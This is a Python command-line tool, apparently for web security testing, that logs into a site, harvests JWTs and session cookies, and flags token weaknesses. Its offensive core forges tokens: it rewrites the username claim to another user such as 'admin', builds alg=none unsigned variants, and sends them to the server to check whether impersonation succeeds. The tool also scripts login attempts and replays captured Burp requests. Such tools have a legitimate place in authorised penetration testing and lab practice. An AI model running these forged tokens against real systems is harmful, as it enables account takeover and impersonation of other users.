#!/usr/bin/env python3

import base64
import json
import os
import re
import time
from urllib.parse import urljoin

import requests

# ---------------------------------------------------------------------------
# terminal theme / clean UI
# ---------------------------------------------------------------------------

class Theme:
    """Small ANSI theme with no external dependencies."""
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"

    RED = "\033[38;5;203m"
    GREEN = "\033[38;5;114m"
    YELLOW = "\033[38;5;221m"
    BLUE = "\033[38;5;117m"
    CYAN = "\033[38;5;116m"
    WHITE = "\033[38;5;255m"
    GRAY = "\033[38;5;245m"

    @classmethod
    def enabled(cls):
        return os.getenv("NO_COLOR") is None and os.isatty(1)

    @classmethod
    def c(cls, color, value, bold=False):
        if not cls.enabled():
            return str(value)
        prefix = cls.BOLD if bold else ""
        return f"{prefix}{color}{value}{cls.RESET}"


def ui_rule(char="─", width=64):
    return Theme.c(Theme.GRAY, char * width)


def ui_title(title):
    print()
    print(ui_rule())
    print(Theme.c(Theme.CYAN, f"  {title}", bold=True))
    print(ui_rule())


def ui_ok(text):
    print(f"  {Theme.c(Theme.GREEN, '✓', bold=True)} {text}")


def ui_info(text):
    print(f"  {Theme.c(Theme.BLUE, '•')} {text}")


def ui_warn(text):
    print(f"  {Theme.c(Theme.YELLOW, '!', bold=True)} {text}")


def ui_error(text):
    print(f"  {Theme.c(Theme.RED, '✗', bold=True)} {text}")


def print_finding(finding):
    if finding.startswith("[CRITICAL]"):
        print(f"  {Theme.c(Theme.RED, '●', bold=True)} {Theme.c(Theme.RED, finding, bold=True)}")
    elif finding.startswith("[WARN]"):
        print(f"  {Theme.c(Theme.YELLOW, '●', bold=True)} {Theme.c(Theme.YELLOW, finding)}")
    elif finding.startswith("[INFO]"):
        print(f"  {Theme.c(Theme.BLUE, '●')} {Theme.c(Theme.BLUE, finding)}")
    else:
        print(f"  {Theme.c(Theme.GRAY, '●')} {finding}")


def menu_item(number, label, description=""):
    number_text = Theme.c(Theme.CYAN, f"{number}", bold=True)
    label_text = Theme.c(Theme.WHITE, label, bold=True)
    if description:
        return f"  {number_text}  {label_text} {Theme.c(Theme.GRAY, '— ' + description)}"
    return f"  {number_text}  {label_text}"


def banner():
    print()
    print(Theme.c(Theme.CYAN, " "))
    print(Theme.c(Theme.CYAN, " ") + Theme.c(Theme.WHITE, "  JWT", bold=True) +
          Theme.c(Theme.GRAY, "  recon • decode • analyze • tamper") +
          Theme.c(Theme.CYAN, "                              "))
    print(Theme.c(Theme.CYAN, ""))


JWT_REGEX = re.compile(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')


# ---------------------------------------------------------------------------
# base64url helpers
# ---------------------------------------------------------------------------

def b64url_decode(data):
    data += '=' * (-len(data) % 4)
    return base64.urlsafe_b64decode(data)


def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


# ---------------------------------------------------------------------------
# JWT decode / analyze
# ---------------------------------------------------------------------------

def decode_jwt(token):
    parts = token.split('.')
    if len(parts) < 2:
        return None
    try:
        header = json.loads(b64url_decode(parts[0]))
    except Exception:
        header = None
    try:
        payload = json.loads(b64url_decode(parts[1]))
    except Exception:
        payload = None
    sig = parts[2] if len(parts) > 2 else ''
    return {'header': header, 'payload': payload, 'signature': sig, 'raw_parts': parts}


def analyze_jwt(decoded):
    findings = []
    header = decoded['header'] or {}
    payload = decoded['payload'] or {}

    alg = str(header.get('alg', ''))
    if alg.lower() == 'none':
        findings.append("[CRITICAL] alg=none - server may accept unsigned tokens.")

    if 'exp' not in payload:
        findings.append("[WARN] No 'exp' claim - token may never expire.")
    else:
        try:
            if int(payload['exp']) < time.time():
                findings.append("[INFO] Token is EXPIRED.")
        except Exception:
            findings.append("[WARN] 'exp' claim is not a valid timestamp.")

    for claim in ('role', 'admin', 'is_admin', 'isAdmin', 'roles', 'scope', 'permissions', 'privilege'):
        if claim in payload:
            findings.append(f"[INFO] Privilege-related claim found: {claim} = {payload[claim]}")

    for hdr_key in ('kid', 'jku', 'x5u'):
        if hdr_key in header:
            findings.append(
                f"[WARN] Header contains '{hdr_key}' = {header[hdr_key]} "
                "- check for path traversal / SSRF / key-confusion injection."
            )

    if alg.upper().startswith('HS') and ('jku' in header or 'x5u' in header):
        findings.append("[WARN] HMAC alg combined with jku/x5u is unusual - check for algorithm confusion (RS->HS).")

    return findings


def pretty_print_jwt(token, label="JWT", show_banner=True):
    if show_banner:
        ui_title(label)

    print(f"  {Theme.c(Theme.GRAY, 'Raw:')} {token}")
    decoded = decode_jwt(token)
    if not decoded:
        ui_error("Could not parse as JWT.")
        return None

    print()
    print(Theme.c(Theme.CYAN, "  Header", bold=True))
    print(Theme.c(Theme.GRAY, "  " + "─" * 20))
    print(json.dumps(decoded['header'], indent=2) if decoded['header'] is not None else "  <undecodable>")

    print()
    print(Theme.c(Theme.CYAN, "  Payload", bold=True))
    print(Theme.c(Theme.GRAY, "  " + "─" * 20))
    print(json.dumps(decoded['payload'], indent=2) if decoded['payload'] is not None else "  <undecodable>")

    sig_preview = decoded['signature'][:40] + ('...' if len(decoded['signature']) > 40 else '')
    print()
    print(f"  {Theme.c(Theme.GRAY, 'Signature:')} {sig_preview}")

    findings = analyze_jwt(decoded)
    print()
    print(Theme.c(Theme.CYAN, "  Findings", bold=True))
    print(Theme.c(Theme.GRAY, "  " + "─" * 20))
    if findings:
        for finding in findings:
            print_finding(finding)
    else:
        ui_ok("None of the checked issues were detected.")

    return decoded


# ---------------------------------------------------------------------------
# scanning helpers
# ---------------------------------------------------------------------------

def find_jwts_in_text(text):
    return list(set(JWT_REGEX.findall(text or "")))


def scan_response_for_tokens(resp, session=None):
    """Scan for JWTs/session tokens. Checks the final response AND every hop in
    the redirect chain (resp.history) for headers/body, since a Set-Cookie with
    the JWT is often only present on the 302, not on the page it redirects to.
    Cookies are read from the full session jar when available, since resp.cookies
    only reflects the *last* request's cookies, not ones set mid-redirect."""
    found = {'headers': [], 'cookies': [], 'session_cookies': {}, 'body': []}

    all_responses = list(getattr(resp, 'history', []) or []) + [resp]
    for r in all_responses:
        header_blob = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        found['headers'].extend(find_jwts_in_text(header_blob))
        try:
            body_text = r.text
        except Exception:
            body_text = ""
        found['body'].extend(find_jwts_in_text(body_text))

    found['headers'] = list(set(found['headers']))
    found['body'] = list(set(found['body']))

    # Prefer the accumulated session cookie jar (survives across redirects);
    # fall back to resp.cookies if no session object was passed in.
    cookie_source = session.cookies.get_dict() if session is not None else resp.cookies.get_dict()
    jwt_cookies, session_like = [], {}
    for k, v in cookie_source.items():
        if JWT_REGEX.match(v):
            jwt_cookies.append(v)
        else:
            session_like[k] = v
    found['cookies'] = list(set(jwt_cookies))
    found['session_cookies'] = session_like

    return found


def report(results):
    any_found = False

    seen_order = []
    seen_locations = {}
    for section in ('cookies', 'headers', 'body'):
        for t in results.get(section, []):
            if t not in seen_locations:
                seen_order.append(t)
                seen_locations[t] = []
            seen_locations[t].append(section)

    for t in seen_order:
        any_found = True
        locs = ', '.join(seen_locations[t])
        print()
        ui_ok(f"JWT found  {Theme.c(Theme.GRAY, f'[{locs}]')}")
        pretty_print_jwt(t, show_banner=False)

    session_cookies = results.get('session_cookies', {})
    if session_cookies:
        any_found = True
        print()
        ui_title("Session cookies")
        for k, v in session_cookies.items():
            print(f"  {Theme.c(Theme.CYAN, k)} {Theme.c(Theme.GRAY, '=')} {v}")

    if not any_found:
        print()
        ui_warn("No JWTs or obvious session tokens found in this response.")


# ---------------------------------------------------------------------------
# login mode
# ---------------------------------------------------------------------------

FORM_REGEX = re.compile(r'<form\b[^>]*>.*?</form>', re.IGNORECASE | re.DOTALL)
FORM_TAG_REGEX = re.compile(r'<form\b[^>]*>', re.IGNORECASE)
INPUT_REGEX = re.compile(r'<input\b[^>]*>', re.IGNORECASE)
ATTR_REGEX = lambda name: re.compile(rf'{name}\s*=\s*["\']([^"\']*)["\']', re.IGNORECASE)

NAME_RE = ATTR_REGEX('name')
VALUE_RE = ATTR_REGEX('value')
TYPE_RE = ATTR_REGEX('type')
ACTION_RE = ATTR_REGEX('action')
METHOD_RE = ATTR_REGEX('method')


def extract_login_form(html, base_url):
    """
    Find the <form> that contains a password input, pull out its action URL,
    method, and every field (including hidden CSRF tokens) with default values.
    Returns None if no password-bearing form is found.
    """
    for form_html in FORM_REGEX.findall(html):
        inputs = INPUT_REGEX.findall(form_html)
        fields = {}   # name -> (value, type)
        has_password = False
        for tag in inputs:
            name_m = NAME_RE.search(tag)
            if not name_m:
                continue
            name = name_m.group(1)
            value_m = VALUE_RE.search(tag)
            value = value_m.group(1) if value_m else ""
            type_m = TYPE_RE.search(tag)
            ftype = (type_m.group(1) if type_m else "text").lower()
            fields[name] = (value, ftype)
            if ftype == "password":
                has_password = True

        if not has_password:
            continue  # not the login form

        form_tag_match = FORM_TAG_REGEX.search(form_html)
        form_tag = form_tag_match.group(0) if form_tag_match else ""
        action_m = ACTION_RE.search(form_tag)
        method_m = METHOD_RE.search(form_tag)
        action = action_m.group(1) if action_m else ""
        method = (method_m.group(1) if method_m else "POST").upper()
        action_url = urljoin(base_url, action) if action else base_url

        return {"action_url": action_url, "method": method, "fields": fields}

    return None


def guess_field_names(fields):
    """Given {name: (value, type)} from the real form, guess which is username vs password."""
    user_field = None
    pass_field = None
    for name, (_, ftype) in fields.items():
        if ftype == "password":
            pass_field = name
        elif ftype in ("text", "email") and user_field is None:
            lname = name.lower()
            if any(hint in lname for hint in ("user", "email", "login", "name")):
                user_field = name
    if user_field is None:
        for name, (_, ftype) in fields.items():
            if ftype in ("text", "email") and name != pass_field:
                user_field = name
                break
    return user_field, pass_field


def extract_all_hidden_fields(html):
    """Grab every hidden input on the page (not just inside a matched form) - covers
    CSRF tokens that sit outside a <form> the password-regex happens to match."""
    hidden = {}
    for tag in INPUT_REGEX.findall(html):
        type_m = TYPE_RE.search(tag)
        if type_m and type_m.group(1).lower() == "hidden":
            name_m = NAME_RE.search(tag)
            if name_m:
                value_m = VALUE_RE.search(tag)
                hidden[name_m.group(1)] = value_m.group(1) if value_m else ""
    return hidden


# Common field-name candidates, tried in order. If the real <form> is detected
# these are skipped entirely; they only kick in as an automatic fallback.
USERNAME_CANDIDATES_BY_TYPE = {
    "username": ["username", "user", "uname", "login", "name"],
    "email":    ["email", "username", "user_email", "user", "login"],
}
PASSWORD_CANDIDATES = ["password", "pass", "pwd", "passwd", "passcode"]


def build_attempt_list(url, identifier_type, form, hidden_fields):
    """Returns an ordered list of (user_field, pass_field, content_type, extra_fields, action_url)
    to try. Detected form fields always go first; brute-force candidates are the safety net."""
    attempts = []

    if form:
        action_url = form["action_url"]
        extra = {n: v for n, (v, t) in form["fields"].items() if t == "hidden"}
        auto_user, auto_pass = guess_field_names(form["fields"])
        if auto_user and auto_pass:
            attempts.append((auto_user, auto_pass, "form", extra, action_url))
            attempts.append((auto_user, auto_pass, "json", extra, action_url))
        # in case the form has more than one password-type field
        for name, (_, ftype) in form["fields"].items():
            if ftype == "password" and name != auto_pass and auto_user:
                attempts.append((auto_user, name, "form", extra, action_url))
    else:
        action_url = url

    for uf in USERNAME_CANDIDATES_BY_TYPE.get(identifier_type, USERNAME_CANDIDATES_BY_TYPE["username"]):
        for pf in PASSWORD_CANDIDATES:
            attempts.append((uf, pf, "form", dict(hidden_fields), action_url))
            attempts.append((uf, pf, "json", dict(hidden_fields), action_url))

    seen = set()
    unique = []
    for a in attempts:
        key = (a[0], a[1], a[2], a[4])
        if key not in seen:
            seen.add(key)
            unique.append(a)
    return unique


def looks_successful(resp, pre_cookies, post_cookies, action_url, jwt_found):
    if resp is None or resp.status_code >= 400:
        return False
    cookies_changed = post_cookies != pre_cookies
    redirected_away = bool(resp.history) and resp.url.rstrip('/') != action_url.rstrip('/')
    return jwt_found or cookies_changed or redirected_away


def auto_login(url, identifier, identifier_type, password):
    """Fully automated login: fetch the page, detect the real form (incl. CSRF
    token), and if that doesn't succeed, automatically try common username/
    password field-name and content-type combinations until one works."""
    session = requests.Session()

    ui_info(f"Fetching login page: {url}")
    try:
        get_resp = session.get(url, timeout=15, allow_redirects=True)
    except requests.RequestException as e:
        ui_error(f"Could not fetch login page: {e}")
        return None, None, session

    form = extract_login_form(get_resp.text, get_resp.url)
    hidden_fields = extract_all_hidden_fields(get_resp.text)

    if form:
        hidden_names = [n for n, (_, t) in form["fields"].items() if t == "hidden"]
        ui_ok(f"Detected login form → {form['action_url']} ({form['method']})")
        if hidden_names:
            ui_ok(f"Hidden field(s) captured: {', '.join(hidden_names)}")
    else:
        ui_info("No obvious password form; trying common field names.")

    attempts = build_attempt_list(get_resp.url, identifier_type, form, hidden_fields)
    print(f"[*] Up to {len(attempts)} field/content-type combination(s) queued.")

    for i, (uf, pf, ct, extra, action_url) in enumerate(attempts, 1):
        pre_cookies = dict(session.cookies.get_dict())
        payload = dict(extra)
        payload[uf] = identifier
        payload[pf] = password

        try:
            if ct == "json":
                resp = session.post(action_url, json=payload, timeout=15, allow_redirects=True)
            else:
                resp = session.post(action_url, data=payload, timeout=15, allow_redirects=True)
        except requests.RequestException as e:
            print(f"    [-] attempt {i}/{len(attempts)} errored ({uf}/{pf}, {ct}): {e}")
            continue

        post_cookies = dict(session.cookies.get_dict())
        results = scan_response_for_tokens(resp, session=session)
        jwt_found = bool(results['headers'] or results['cookies'] or results['body'])

        if looks_successful(resp, pre_cookies, post_cookies, action_url, jwt_found):
            print(f"[+] Success on attempt {i}/{len(attempts)}: "
                  f"user_field='{uf}', pass_field='{pf}', content_type={ct}")
            print(f"[*] Status: {resp.status_code} (final URL: {resp.url})")
            return resp, results, session

        print(f"    [-] attempt {i}/{len(attempts)} failed "
              f"(user_field='{uf}', pass_field='{pf}', {ct}) - status {resp.status_code}")

        # Re-pull the login page before the next attempt: many CSRF schemes
        # bind the token to the *specific* session cookie issued alongside it,
        # so a stale token from attempt 1 can silently break attempt 2.
        try:
            get_resp = session.get(url, timeout=15, allow_redirects=True)
            hidden_fields = extract_all_hidden_fields(get_resp.text)
            refreshed_form = extract_login_form(get_resp.text, get_resp.url)
            if refreshed_form:
                for name, (_, t) in refreshed_form["fields"].items():
                    if t == "hidden" and name in extra:
                        extra[name] = refreshed_form["fields"][name][0]
        except requests.RequestException:
            pass

    print("[!] All automatic login attempts failed.")
    return None, None, session


def find_cookie_name_for_token(session, resp, token):
    """Figure out which cookie name carried this JWT, so a tampered version can
    be sent back the same way. Checks the live session jar first, then falls
    back to scanning raw Set-Cookie headers across the redirect chain."""
    for k, v in session.cookies.get_dict().items():
        if v == token:
            return k

    all_responses = list(getattr(resp, 'history', []) or []) + [resp]
    for r in all_responses:
        for k, v in r.headers.items():
            if k.lower() == 'set-cookie' and token in v:
                return v.split('=', 1)[0].strip()
    return None


def build_target_url(resp_url, current_username, new_username):
    """If the current username literally appears in the URL (e.g. ?id=wiener),
    swap it for the new one so the test hits the right resource automatically."""
    current_str = str(current_username)
    if current_str and current_str in resp_url:
        return resp_url.replace(current_str, str(new_username))
    return resp_url


def try_tampered_token(target_url, cookie_name, use_header, new_token, new_val):
    """Send one tampered token variant and return a verdict."""
    test_session = requests.Session()
    headers = {}
    cookies = {}
    if use_header:
        headers['Authorization'] = f"Bearer {new_token}"
    else:
        cookies[cookie_name] = new_token

    try:
        test_resp = test_session.get(target_url, headers=headers, cookies=cookies,
                                      timeout=15, allow_redirects=True)
    except requests.RequestException as e:
        return {"verdict": "ERROR", "detail": str(e), "status": None, "url": None}

    accepted = str(new_val) in test_resp.text
    if accepted:
        verdict = "ACCEPTED"
    elif test_resp.status_code == 200 and 'login' not in test_resp.url.lower():
        verdict = "MAYBE"
    else:
        verdict = "REJECTED"

    return {"verdict": verdict, "status": test_resp.status_code, "url": test_resp.url,
            "detail": None}


def offer_username_tamper_test(token, session, resp):
    """After a successful login, offer to change the username/sub claim to a
    different user and automatically test whether the server accepts it -
    trying both a kept-original signature and an alg=none variant, against
    an auto-derived target URL, with no further prompts needed."""
    decoded = decode_jwt(token)
    if not decoded or decoded['payload'] is None:
        return

    header = decoded['header'] or {}
    payload = decoded['payload']

    print("\n=== Test user impersonation via tampered JWT ===")
    do_test = input(
        "Tamper the username claim (e.g. brxzyy -> admin) and test if it's accepted? [y/N]: "
    ).strip().lower()
    if do_test != 'y':
        return

    candidate_keys = [k for k in ('sub', 'username', 'user', 'name', 'preferred_username') if k in payload]

    if len(candidate_keys) == 1:
        claim_key = candidate_keys[0]
        print(f"[*] Using '{claim_key}' as the username claim (current value: {payload[claim_key]}).")
    elif len(candidate_keys) > 1:
        print(f"Multiple possible username claims found: {', '.join(candidate_keys)}")
        claim_key = input(f"Which one to modify? [default: {candidate_keys[0]}]: ").strip() or candidate_keys[0]
    else:
        print("No obvious username claim auto-detected. Full payload:")
        print(json.dumps(payload, indent=2))
        claim_key = input("Claim name to modify: ").strip()

    if claim_key not in payload:
        print(f"[!] '{claim_key}' isn't a claim in this payload - aborting.")
        return

    current_val = payload[claim_key]
    new_val = input(f"Username to test as [currently: {current_val}]: ").strip()
    if not new_val:
        print("[!] No new value given - aborting.")
        return

    cookie_name = find_cookie_name_for_token(session, resp, token)
    use_header = cookie_name is None
    if cookie_name:
        print(f"[*] Token is carried in cookie '{cookie_name}' - tampered versions will be sent the same way.")
    else:
        print("[i] Couldn't determine a cookie name automatically - sending as 'Authorization: Bearer' instead.")

    target_url = build_target_url(resp.url, current_val, new_val)
    if target_url != resp.url:
        print(f"[*] Auto-adjusted test URL: {target_url}")
    else:
        print(f"[*] Testing against: {target_url}")

    new_payload = dict(payload)
    new_payload[claim_key] = new_val

    variants = [
        ("Original signature kept", dict(header), decoded['signature']),
        ("alg=none, signature stripped", {**dict(header), 'alg': 'none'}, ''),
    ]

    print(f"\n[*] Auto-testing {len(variants)} tamper variants...")
    outcomes = []
    for label, hdr, sig in variants:
        new_token = f"{b64url_encode(json.dumps(hdr).encode())}.{b64url_encode(json.dumps(new_payload).encode())}.{sig}"
        result = try_tampered_token(target_url, cookie_name, use_header, new_token, new_val)
        outcomes.append((label, new_token, result))

        icon = {"ACCEPTED": "[+]", "MAYBE": "[i]", "REJECTED": "[-]", "ERROR": "[!]"}[result["verdict"]]
        if result["verdict"] == "ERROR":
            print(f"  {icon} {label}: request failed ({result['detail']})")
        else:
            print(f"  {icon} {label}: {result['verdict']} (status {result['status']})")

    print("\n=== Summary ===")
    any_accepted = False
    for label, new_token, result in outcomes:
        if result["verdict"] in ("ACCEPTED", "MAYBE"):
            any_accepted = True
            print(f"- {label}: {result['verdict']}")
            print(f"    token: {new_token}")
    if not any_accepted:
        print("- Neither variant was accepted - the server appears to validate the signature/claim properly.")
    else:
        print("\n(\"MAYBE\" means it got a 200 off the login page but the new username wasn't confirmed in the "
              "response body - verify manually.)")


def mode_login(url):
    print(f"\n[*] Login mode for {url}")
    print("Login using:")
    print("  1. Username")
    print("  2. Email")
    id_choice = input("Choose: ").strip()
    identifier_type = "email" if id_choice == "2" else "username"
    identifier = input(f"{'Email' if identifier_type == 'email' else 'Username'}: ").strip()
    password = input("Password: ").strip()

    resp, results, session = auto_login(url, identifier, identifier_type, password)

    if resp is None:
        offer_req_txt_fallback(session)
        return

    print()
    report(results)

    primary_token = None
    for section in ('cookies', 'headers', 'body'):
        if results.get(section):
            primary_token = results[section][0]
            break

    if primary_token:
        offer_username_tamper_test(primary_token, session, resp)

    any_tokens = any(results[s] for s in ('headers', 'cookies', 'body')) or results['session_cookies']
    if not any_tokens:
        follow_up = input(
            "Login looked successful but no JWT showed up on this page. "
            "Fetch another authenticated URL to check (e.g. /my-account, /api/me)? [y/N]: "
        ).strip().lower()
        if follow_up == 'y':
            extra_url = input("URL to fetch (same session/cookies reused): ").strip()
            try:
                extra_resp = session.get(extra_url, timeout=15, allow_redirects=True)
                print(f"[*] Status: {extra_resp.status_code}")
                report(scan_response_for_tokens(extra_resp, session=session))
            except requests.RequestException as e:
                print(f"[!] Follow-up request failed: {e}")

    print("\n[i] Current session cookies (full jar, for reference):")
    for k, v in session.cookies.get_dict().items():
        print(f"  {k} = {v}")


def offer_req_txt_fallback(session=None):
    choice = input("Provide a raw request file (req.txt, e.g. saved from Burp/DevTools) to replay instead? [y/N]: ").strip().lower()
    if choice == 'y':
        fallback_to_req_txt(session)


def parse_raw_request(raw_text):
    """Parse a raw HTTP request (as saved from Burp Suite / browser devtools 'Copy as text')."""
    lines = raw_text.splitlines()
    if not lines:
        raise ValueError("Empty request file.")

    request_line = lines[0]
    parts = request_line.split(' ')
    if len(parts) < 2:
        raise ValueError("Malformed request line - expected 'METHOD /path HTTP/1.1'.")
    method, path = parts[0], parts[1]

    headers = {}
    body_lines = []
    in_body = False
    host = None
    for line in lines[1:]:
        if not in_body:
            if line.strip() == '':
                in_body = True
                continue
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip()] = v.strip()
                if k.strip().lower() == 'host':
                    host = v.strip()
        else:
            body_lines.append(line)
    body = "\n".join(body_lines)

    scheme = 'https'
    url = f"{scheme}://{host}{path}" if host else path
    return method, url, headers, body


def fallback_to_req_txt(session=None):
    path = input("Path to req.txt: ").strip()
    if not os.path.isfile(path):
        print("[!] File not found.")
        return
    with open(path, 'r', errors='ignore') as f:
        raw = f.read()
    try:
        method, url, headers, body = parse_raw_request(raw)
    except Exception as e:
        print(f"[!] Could not parse request file: {e}")
        return

    print(f"[*] Replaying {method} {url}")
    sess = session or requests.Session()
    scheme_choice = input("If HTTPS fails, retry over HTTP automatically? [Y/n]: ").strip().lower()
    try:
        resp = sess.request(method, url, headers=headers, data=body if body else None,
                             timeout=15, allow_redirects=True)
    except requests.RequestException as e:
        if scheme_choice != 'n' and url.startswith('https://'):
            http_url = 'http://' + url[len('https://'):]
            print(f"[*] HTTPS failed ({e}), retrying over HTTP: {http_url}")
            try:
                resp = sess.request(method, http_url, headers=headers, data=body if body else None,
                                     timeout=15, allow_redirects=True)
            except requests.RequestException as e2:
                print(f"[!] Replay failed: {e2}")
                return
        else:
            print(f"[!] Replay failed: {e}")
            return

    print(f"[*] Status: {resp.status_code}")
    report(scan_response_for_tokens(resp, session=sess))


# ---------------------------------------------------------------------------
# tamper menu
# ---------------------------------------------------------------------------

def tamper_menu():
    print("\n=== Tamper a token ===")
    token = input("Paste JWT to tamper: ").strip()
    decoded = decode_jwt(token)
    if not decoded or decoded['header'] is None or decoded['payload'] is None:
        print("[!] Could not decode this token.")
        return
    header, payload = dict(decoded['header']), dict(decoded['payload'])
    print("\nCurrent header:", json.dumps(header, indent=2))
    print("Current payload:", json.dumps(payload, indent=2))

    print("\nOptions:")
    print("  1. Set alg to 'none' and strip signature")
    print("  2. Edit a claim in the payload")
    print("  3. Edit a header field")
    print("  4. Re-encode as-is (drops signature)")
    choice = input("Choose: ").strip()

    sig = decoded['signature']

    if choice == '1':
        header['alg'] = 'none'
        sig = ''
    elif choice == '2':
        key = input("Claim name to set: ").strip()
        val = input("New value (parsed as JSON if possible, else kept as string): ").strip()
        try:
            val = json.loads(val)
        except Exception:
            pass
        payload[key] = val
    elif choice == '3':
        key = input("Header field to set: ").strip()
        val = input("New value: ").strip()
        header[key] = val
    else:
        pass

    new_token = f"{b64url_encode(json.dumps(header).encode())}.{b64url_encode(json.dumps(payload).encode())}.{sig}"

    print(f"\n[+] New token:\n{new_token}")
    print("\nNote: this is an unsigned / re-encoded token for testing purposes only.")
    print("It will only be accepted by a server that has a real vulnerability")
    print("(alg=none acceptance, weak/known signing key, jku/kid injection, etc).")


# ---------------------------------------------------------------------------
# main menu
# ---------------------------------------------------------------------------

def main():
    banner()

    while True:
        print()
        print(Theme.c(Theme.WHITE, "  Main menu", bold=True))
        print()
        print(menu_item("1", "Login & extract JWT", "authenticate and inspect tokens"))
        print(menu_item("2", "Decode & analyze JWT", "inspect a token you already have"))
        print(menu_item("3", "Tamper JWT", "modify claims or headers"))
        print(menu_item("4", "Quit"))
        print()

        try:
            choice = input(Theme.c(Theme.CYAN, "  › ", bold=True)).strip()
        except (KeyboardInterrupt, EOFError):
            print()
            break

        if choice == '1':
            url = input(f"  {Theme.c(Theme.GRAY, 'Site URL (login page):')} ").strip()
            mode_login(url)
        elif choice == '2':
            token = input(f"  {Theme.c(Theme.GRAY, 'Paste JWT:')} ").strip()
            pretty_print_jwt(token)
        elif choice == '3':
            tamper_menu()
        elif choice == '4':
            print()
            ui_info("Goodbye.")
            break
        else:
            ui_warn("Invalid choice.")


if __name__ == '__main__':
    main()
